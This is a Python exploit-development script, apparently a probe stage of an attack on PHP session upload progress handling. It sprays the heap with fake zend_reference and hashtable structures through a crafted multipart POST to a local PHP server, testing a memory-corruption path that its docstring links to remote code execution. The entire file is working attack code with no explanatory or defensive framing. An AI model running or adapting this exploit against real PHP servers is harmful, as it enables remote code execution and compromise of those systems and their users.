#!/usr/bin/env python3
"""Probe B: like send_b_rce2 but fake ref val.value=MARK and val.type=IS_ARRAY.
If the fake ref lands at R0, zend_reference_destroy sees val.value=MARK.
usage: send_b_probe.py N1 N2 MARK
"""
import socket,struct,sys
N1=int(sys.argv[1]); N2=int(sys.argv[2]); MARK=int(sys.argv[3],0)
BND=b'B'*10; HOST='127.0.0.1'; PORT=8088; SID=b'attacksessionid0001'
ht=bytearray(b'H'*167)
ref=bytearray(b'X'*55)
struct.pack_into('<II',ref,16,1,10)
struct.pack_into('<Q',ref,24,MARK)
struct.pack_into('<Q',ref,32,0x307)
struct.pack_into('<Q',ref,40,0)
parts=[{'name':'PHPSESSID','data':SID},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
for i in range(N1):
    parts.append({'name':('a%030d'%i)[:31],'data':bytes(ht)})
for i in range(N2):
    parts.append({'name':('f%02d'%i),'data':bytes(ref)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+BND+b'--\r\n'; body=bytes(o)
h=(f'POST /index.php HTTP/1.1\r\nHost: {HOST}:{PORT}\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection((HOST,PORT),timeout=15); s.settimeout(15)
try: s.sendall(h+body)
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
